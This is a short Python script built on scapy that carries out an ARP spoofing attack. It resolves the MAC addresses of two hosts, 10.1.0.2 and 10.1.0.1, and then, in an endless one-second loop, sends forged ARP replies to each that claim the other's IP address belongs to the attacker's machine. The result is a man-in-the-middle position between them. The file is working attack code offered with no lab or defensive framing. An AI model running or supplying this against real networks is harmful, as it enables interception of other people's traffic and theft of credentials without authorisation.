from scapy.all import Ether, ARP, srp, send
import argparse
import time

def get_mac(ip):
    answer, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if answer:
        return answer[0][1].src

def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)

    self_mac = ARP().hwsrc
    print("[+] Telling {} that {} is-at {}".format(target_ip, host_ip, self_mac))

if __name__ == "__main__":
    target = "10.1.0.2"
    host = "10.1.0.1"

    while True:
         # acting like host.
         spoof(target, host)
         # acting like target.
         spoof(host, target)
         # sleep for one second
         time.sleep(1)

